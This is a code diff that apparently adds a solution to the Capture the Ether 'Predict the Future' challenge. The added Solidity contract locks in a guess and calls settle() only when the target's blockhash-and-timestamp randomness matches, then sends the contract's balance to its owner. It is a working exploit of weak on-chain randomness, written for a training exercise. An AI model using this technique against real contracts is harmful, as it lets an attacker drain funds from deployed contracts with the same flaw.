@@ -36,3 +36,28 @@ contract PredictTheFutureChallenge {
         }
     }
 }
+
+contract PredictTheFutureChallengeAttacker {
+    PredictTheFutureChallenge target;
+    address owner;
+
+    function PredictTheFutureChallengeAttacker(address targetAddress)
+        public
+        payable
+    {
+        target = PredictTheFutureChallenge(targetAddress);
+        owner = msg.sender;
+        target.lockInGuess.value(1 ether)(0);
+    }
+
+    function attack() public returns (bool) {
+        if (
+            uint8(keccak256(block.blockhash(block.number - 1), now)) % 10 == 0
+        ) {
+            target.settle();
+            owner.transfer(address(this).balance);
+        }
+    }
+
+    function() public payable {}
+}
